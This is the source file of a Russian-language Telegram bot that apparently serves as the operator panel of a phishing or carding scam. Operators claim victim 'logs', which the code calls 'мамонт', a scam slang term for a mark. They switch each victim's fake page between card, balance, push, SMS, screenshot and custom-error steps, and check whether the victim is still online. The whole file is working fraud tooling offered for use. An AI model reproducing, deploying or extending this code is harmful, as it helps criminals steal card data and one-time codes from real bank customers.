const stage = require("./handlers/scenes");
const {
    Logs
} = require("./config/database");
const config = require("./config/config");
const logsGroupId = config.bot.logsGroupId;
const vbivButtons = require("./handlers/functions/vbivButtons");
const withOutWriter = require("./handlers/functions/withOutWriter");
const withWriter = require("./handlers/functions/withWriter");
const writerMessage = require("./handlers/functions/writerMessage");

const { Telegraf, session } = require("telegraf"),
    bot = new Telegraf(config.bot.token);

// Обработка ошибок Telegram
bot.catch((err, ctx) => {
    console.error('Telegram bot error:', err);
    if (ctx && ctx.reply) {
        ctx.reply('Произошла ошибка. Попробуйте позже.').catch(console.error);
    }
});

bot.use(session());
bot.use(stage.middleware());


bot.action(/^customError_([A-Za-z0-9_]+)$/, async (ctx) => {
    const log = await Logs.findOne({
        where: {
            id: ctx.match[1]
        }
    })

    if(!log) return ctx
        .answerCbQuery(
            `♻️ Лог с ID ${ctx.match[1]} не найден!`,
            true
        )
        .catch((err) => err);

    return ctx.scene.enter('customError', {
        logId: ctx.match[1]
    }).catch((err) => {
        console.error("Error entering customError scene:", err);
    });
});


bot.action(/^custom_([A-Za-z0-9_]+)$/, async (ctx) => {
    const log = await Logs.findOne({
        where: {
            id: ctx.match[1]
        }
    })

    if(!log) return ctx
        .answerCbQuery(
            `♻️ Лог с ID ${ctx.match[1]} не найден!`,
            true
        )
        .catch((err) => err);

    return ctx.scene.enter(`custom`, {
        logId: ctx.match[1],
    }).catch((err) => {
        console.error("Error entering custom scene:", err);
    });
});

bot.action(/^customscreen_([A-Za-z0-9_]+)$/, async (ctx) => {
    const log = await Logs.findOne({
        where: {
            id: ctx.match[1]
        }
    })

    if(!log) return ctx
        .answerCbQuery(
            `♻️ Лог с ID ${ctx.match[1]} не найден!`,
            true
        )
        .catch((err) => err);

    return ctx.scene.enter(`custom_screen`, {
        logId: ctx.match[1],
    }).catch((err) => {
        console.error("Error entering custom scene:", err);
    });
});

bot.action(/^log_(\d+)_setStatus_(change|screen|skip|card|balance|push|sms|success|custom|customError)$/, async (ctx) => {
    try {
    const logId = ctx.match[1];
    const newStatus = ctx.match[2];
    const log = await Logs.findOne({
        where: {
            id: logId,
        }
    });

    if (!log) return ctx.answerCbQuery("⚠️ Лог не найден", true);

    if (ctx.from.id !== log.writerId) {
        await ctx.deleteMessage().catch((err) => err);
        return ctx.answerCbQuery("⚠️ Это не твой лог!", true);
    }

    if (newStatus == 'customError' || newStatus == 'custom' || newStatus == 'screen') {
        await ctx.answerCbQuery("✅ Статус успешно изменен!");
        await ctx.deleteMessage().catch((err) => err);
    }

    await log.update({
        status: newStatus,
    });

    return ctx.telegram.editMessageReplyMarkup(log.writerId, log.writerMsgId, log.writerMsgId,
        await vbivButtons(log)
    ).catch((err) => err);
    } catch (error) {
        console.log(error);
    }
});


bot.action(/^log_(\d+)_leave$/, async (ctx, next) => {
    try {
        const logId = ctx.match[1];

        const log = await Logs.findOne({
            where: {
                id: logId,
            },
        });

        if (!log) return ctx.answerCbQuery("⚠️ Лог не найден", true);

        await log.update({
            writerId: null,
        });


        await ctx.telegram.editMessageReplyMarkup(logsGroupId,
            log.messageId,
            log.messageId,
            await withOutWriter(log)
        );

        await ctx.deleteMessage().catch((err) => err);
        await ctx.telegram.sendMessage(
            logsGroupId,
            `⚠️ Вбивер <b>@${ctx.from.username}</b> отказался от лога!`,
            {
                parse_mode: "HTML",
                reply_to_message_id: log.messageId,
            }
        );
    } catch (err) {
        console.log(err);
        return  ctx.reply(`<b>⛔️ Произошла ошибка!</b>
└Информация уже передана разработчику и решается`, {parse_mode:"HTML"}).catch((err) => err);
    }
});

// взятие лога
bot.action(/^log_take_(\d+)$/, async (ctx) => {
    try {
        const logId = ctx.match[1];

        const log = await Logs.findOne({
            where: {
                id: logId,
            },
        });

        if (!log) return ctx.answerCbQuery("⚠️ Лог не найден", true);

        if (log.writerId) return ctx.answerCbQuery("⚠️ Лог уже взят", true);

        await log.update({
            writerId: ctx.from.id,
        });
        await ctx
            .editMessageReplyMarkup(
                await withWriter(log, ctx.from)
            )
            .catch((err) => err);


        const msg = await ctx.telegram
            .sendMessage(ctx.from.id, await writerMessage(log), {
                parse_mode: "HTML",
                reply_markup: await vbivButtons(log),
            }).catch((err) => err);


        await log.update({
            writerMsgId: msg.message_id,
        });

    } catch (err) {
        console.log(err);
        return  ctx.reply(`<b>⛔️ Произошла ошибка!</b>
└Информация уже передана разработчику и решается`, {parse_mode:"HTML"}).catch((err) => err);
    }
});

bot.action(/^eye_(.+)$/, async(ctx) => {
    try {
        const victim = await Logs.findOne({
            where: {
                id: ctx.match[1],
            },
        });

        if (!victim) {
            return ctx.answerCbQuery('Мамонт не найден');
        }




        const message = victim.online ? '✅ Мамонт на странице!' : `🛑 Мамонт не на сайте!`;
        await ctx.answerCbQuery(message);
        const fiveMinutesAgo = new Date();
        fiveMinutesAgo.setSeconds(fiveMinutesAgo.getSeconds() - 5);


        if (victim.online && victim.updatedAt < fiveMinutesAgo) {
            await victim.update({ online: false });
        }

    } catch (err) {
        console.log(err)
        return  ctx.reply(`<b>⛔️ Произошла ошибка!</b>
└Информация уже передана разработчику и решается`, {parse_mode:"HTML"}).catch((err) => err);
    }
});

// Безопасный запуск бота
async function startBot() {
    try {
        await bot.launch();
        console.log('🤖 Bot Started!');
    } catch (error) {
        console.error('❌ Ошибка запуска бота:', error);
        // Не останавливаем приложение, продолжаем работу без бота
    }
}

startBot();

bot.catch((err) => {
    console.log(`Критическая ошибка при работе бота: ${err}`)
})